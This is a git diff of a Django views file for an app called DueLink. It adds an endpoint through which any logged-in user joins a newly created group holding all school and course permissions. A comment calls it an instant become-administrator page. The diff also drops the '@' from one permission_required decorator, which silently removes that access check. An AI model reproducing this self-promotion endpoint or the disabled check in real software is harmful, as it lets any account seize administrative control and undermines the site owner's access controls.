@@ -1,4 +1,4 @@
-from django.contrib.auth.models import User
+from django.contrib.auth.models import User, Permission, Group
 from django.contrib.auth.decorators import login_required, permission_required
 from django.shortcuts import render, get_object_or_404, redirect
 from django.core.urlresolvers import reverse
@@ -8,7 +8,24 @@ from DueLink.forms import *
 from DueLink.models import *
 
 
-@permission_required('DueLink.add_course')
+#yizhong shunjian rang ni biancheng guanliyuan de yemian
+@login_required
+def admin_get(request):
+    try:
+        if Group.objects.filter(name='duelink_admin').count() == 0:
+                Group.objects.create(name="duelink_admin")
+
+        g = Group.objects.get(name='duelink_admin')
+        t = Permission.objects.filter(codename__icontains='school') | Permission.objects.filter(codename__icontains='course')
+        for each in t: g.permissions.add(each)
+
+        request.user.groups.add(g)
+    except:
+        return HttpResponse("Fail to get promoted")
+
+    return HttpResponse("You are good to go")
+
+permission_required('DueLink.add_course')
 @permission_required('DueLink.delete_course')
 @login_required
 def manage_course(request):
